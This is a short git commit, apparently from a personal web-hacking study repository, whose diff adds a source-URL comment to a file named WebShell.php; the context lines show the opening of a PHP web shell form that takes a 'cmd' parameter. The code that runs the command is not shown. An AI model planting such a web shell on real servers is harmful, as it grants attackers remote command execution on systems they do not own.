68b69d956a01d6d13bdd2fa4ad3d22a9fe40751e
clip968 <clip968@gmail.com>
2024-05-07 09:44:49 +0900

    0507

--- WebHacking/WebShell.php
+++ WebHacking/WebShell.php
@@ -1,3 +1,4 @@
+// https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
 <html><body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
